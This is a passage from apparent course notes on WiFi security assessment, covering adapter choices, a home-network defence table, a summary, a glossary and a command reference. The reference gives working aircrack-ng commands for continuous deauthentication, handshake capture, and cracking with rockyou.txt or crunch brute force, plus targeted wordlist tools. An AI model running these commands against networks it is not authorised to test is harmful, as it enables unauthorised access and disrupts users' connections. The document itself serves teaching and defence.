- Version 2 and 3 use a different Realtek chipset — requires additional driver setup.
- Always verify the hardware version before purchasing.

**Budget guidance:**

- **Budget (under ₹500):** MediaTek MT7601U — basic functionality, good for learning.
- **Mid-range (₹1000–2000):** TP-Link TL-WN722N v1, Alfa AWUS036NHA — reliable and well-supported.
- **Professional (₹3000+):** Alfa AWUS036ACH, Alfa AWUS1900 — dual-band, high power, industry standard.

---

## 15. How to Secure Your Own WiFi Network (Defence)

Every security assessment should conclude with remediation. Here is how to apply what you've learned to protect your own network:

| Vulnerability                   | Defence                                                                                                                                            |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Weak/common password**        | Use a 12+ character random password with uppercase, lowercase, numbers, and symbols. Avoid dictionary words, names, dates. Use a password manager. |
| **WPA2 deauth attack**          | Upgrade to WPA3 if your router supports it. Enable 802.11w (Protected Management Frames / PMF) on WPA2.                                            |
| **Offline dictionary attack**   | Strong, unique password makes offline cracking computationally infeasible.                                                                         |
| **Default router credentials**  | Change default admin username and password on the router's admin panel immediately.                                                                |
| **WEP or WPA (old encryption)** | Upgrade router firmware or hardware. Configure WPA2 minimum, WPA3 preferred.                                                                       |
| **Hidden SSID (weak security)** | Hidden SSIDs only hide the name — the network is still visible to scanners. Real security comes from encryption strength.                          |
| **MAC address filtering**       | MAC addresses can be spoofed — this is not a reliable security measure alone. Combine with strong encryption.                                      |
| **Guest network isolation**     | Enable guest network with separate SSID and VLAN isolation — prevents guest devices from accessing your main network.                              |
| **Router firmware**             | Keep router firmware updated — patches known vulnerabilities.                                                                                      |

---

## 16. Key Takeaways / Summary

1. WiFi networking works via a router (access point) that creates a hotspot. Clients connect by generating a **handshake packet** containing the password. If the password matches, the connection is established.
2. Every WiFi network has three core identifiers: **ESSID** (name), **BSSID** (MAC address of router), and **Channel** (radio frequency path).
3. **Monitor mode** is the key enabling capability for WiFi security assessment — it allows capturing all packets in range, seeing all connected clients, and injecting custom packets — all without connecting to the network.
4. The **WPA/WPA2 4-way handshake** is the primary target of WiFi attacks — capturing it enables offline password cracking. The password is never transmitted in plain text.
5. **WPA3** is significantly more resistant — its SAE handshake design prevents offline dictionary attacks.
6. The **Aircrack-ng suite** provides all tools needed for assessment: `airmon-ng` (mode switching), `airodump-ng` (capture), `aireplay-ng` (injection/deauth), `aircrack-ng` (cracking).
7. Always run `airmon-ng check kill` before enabling monitor mode to prevent interference from background services.
8. Password cracking effectiveness depends entirely on **password quality** — strong, random passwords make WPA2 practically uncrackable even with good wordlists.
9. **Crunch piped to aircrack-ng** allows exhaustive brute-force without disk storage — but is extremely slow on CPU for long passwords.
10. The most effective professional approach is **targeted wordlist creation** using information gathered about the target — understanding password patterns is more powerful than generic wordlists.
11. WiFi adapter choice matters: ensure **Linux + monitor mode + packet injection support**. Alfra AWUS036ACH and TP-Link TL-WN722N v1 are reliable choices.

---

## 17. Glossary

| Term                        | Definition                                                                                                                                  |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **ESSID**                   | Extended Service Set Identifier — the human-readable name of a WiFi network (hotspot name).                                                 |
| **BSSID**                   | Basic Service Set Identifier — the MAC address of a WiFi access point (router/hotspot).                                                     |
| **Station ID**              | The MAC address of a client device connected to or probing for an access point.                                                             |
| **Handshake File**          | The packet exchange (4-way handshake in WPA2) that occurs when a client authenticates to an access point. Contains a hash of the password.  |
| **Monitor Mode**            | A WiFi adapter mode that enables passive capture of all packets in range and active packet injection, without connecting to any network.    |
| **Managed Mode**            | Default WiFi adapter mode — normal connection and data transfer to associated networks only.                                                |
| **4-Way Handshake**         | The WPA/WPA2 authentication exchange between client and access point, consisting of four messages, that establishes session keys.           |
| **PSK**                     | Pre-Shared Key — a WiFi authentication method where all users share the same password. Common in home networks.                             |
| **Channel**                 | A specific radio frequency path used by a WiFi network for communication (1–13 for 2.4 GHz, higher numbers for 5 GHz).                      |
| **Beacon**                  | Management frames broadcast by an access point to announce its presence and capabilities.                                                   |
| **Deauthentication Attack** | Sending forged deauth frames to forcibly disconnect clients from an access point, exploiting the unauthenticated management frames in WPA2. |
| **PMF / 802.11w**           | Protected Management Frames — a WPA2/WPA3 feature that authenticates management frames, preventing deauth attacks.                          |
| **SAE**                     | Simultaneous Authentication of Equals — WPA3's authentication method that prevents offline dictionary attacks.                              |
| **Aircrack-ng**             | A suite of tools for WiFi network security assessment, including scanning, capture, injection, and cracking capabilities.                   |
| **airodump-ng**             | The Aircrack-ng tool for WiFi packet capture and network scanning.                                                                          |
| **aireplay-ng**             | The Aircrack-ng tool for packet injection, primarily used for deauthentication.                                                             |
| **airmon-ng**               | The Aircrack-ng tool for managing WiFi adapter modes (managed ↔ monitor).                                                                   |
| **rockyou.txt**             | A wordlist of ~14 million real-world passwords from a 2009 data breach, pre-installed in Kali Linux.                                        |
| **Crunch**                  | A Linux tool that generates custom wordlists based on specified character sets and length ranges.                                           |
| **PBKDF2**                  | Password-Based Key Derivation Function 2 — the cryptographic function used to derive WPA2 keys from the password and SSID.                  |
| **Dictionary Attack**       | An offline password cracking method that tests each word in a precompiled list against a captured hash.                                     |
| **Brute Force Attack**      | An exhaustive search testing every possible character combination — effective but extremely slow for long passwords.                        |
| **WEP**                     | Wired Equivalent Privacy — the original (now broken) WiFi encryption standard. Never use.                                                   |
| **WPA/WPA2/WPA3**           | Successive WiFi Protected Access standards. WPA2 is current standard; WPA3 is recommended for new installations.                            |

---

## 18. Full Command Reference

```bash
# ─── ADAPTER MANAGEMENT ──────────────────────────────────────────────────────

# List all network interfaces
ifconfig

# List wireless interfaces only
iwconfig

# List connected USB devices (find adapter chipset)
lsusb

# ─── MONITOR MODE ─────────────────────────────────────────────────────────────

# Kill interfering processes (run FIRST)
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0

# Disable monitor mode (revert to managed)
airmon-ng stop wlan0mon

# Restart NetworkManager after assessment
service NetworkManager restart

# ─── SCANNING (airodump-ng) ───────────────────────────────────────────────────

# Full range scan — all networks in range
airodump-ng wlan0

# Targeted scan — single network, save to file
airodump-ng wlan0 --bssid [BSSID] --channel [CH] --write [FILENAME]

# Example
airodump-ng wlan0 --bssid AA:BB:CC:DD:EE:FF --channel 6 --write my_capture

# ─── DEAUTHENTICATION (aireplay-ng) ──────────────────────────────────────────

# Send 10 deauth packets to a specific client
aireplay-ng --deauth 10 -a [AP_BSSID] -c [CLIENT_MAC] wlan0

# Send continuous deauth to all clients on AP (broadcast)
aireplay-ng --deauth 0 -a [AP_BSSID] wlan0

# Stop with: Ctrl+C

# ─── HANDSHAKE VERIFICATION ───────────────────────────────────────────────────

# Check if handshake is present in capture file
aircrack-ng [CAPTURE_FILE].cap

# Example
aircrack-ng my_capture-01.cap

# ─── PASSWORD CRACKING (aircrack-ng) ─────────────────────────────────────────

# Crack using rockyou.txt wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] [CAPTURE].cap

# Crack using any custom wordlist
aircrack-ng -w /path/to/wordlist.txt -b [BSSID] [CAPTURE].cap

# Extract rockyou.txt if compressed
gunzip /usr/share/wordlists/rockyou.txt.gz

# ─── CRUNCH (WORDLIST GENERATION) ────────────────────────────────────────────

# Generate wordlist to file (warning: huge file size)
crunch [min-len] [max-len] [charset] -o wordlist.txt

# Generate and pipe directly to aircrack-ng (no disk storage)
crunch [min] [max] [charset] | aircrack-ng -w - -b [BSSID] [CAPTURE].cap

# Example: 8-12 chars, lowercase + numbers, piped to aircrack
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF my_capture-01.cap

# Crunch with pattern (-t)
# @ = lowercase, % = number, ^ = uppercase, , = special char
crunch 8 8 -t @@@@%%%% | aircrack-ng -w - -b [BSSID] [CAPTURE].cap

# ─── TARGETED WORDLIST TOOLS ─────────────────────────────────────────────────

# CeWL — generate wordlist from a website
cewl https://targetsite.com -d 2 -w cewl_wordlist.txt

# CUPP — interactive profiling-based wordlist generator
apt install cupp
cupp -i

# ─── DRIVER INSTALLATION ─────────────────────────────────────────────────────

# Install driver via APT
apt install [driver-package-name]

# Manual installation from GitHub
git clone https://github.com/[user]/[driver-repo].git
cd [driver-repo]
make
sudo make install
sudo modprobe [module-name]

# Run AI-generated Python install script
python3 wifi_driver_install.py
```

---

_End of Part 13 transcription notes. Next topic: Advanced WiFi attack techniques and complete defence hardening._
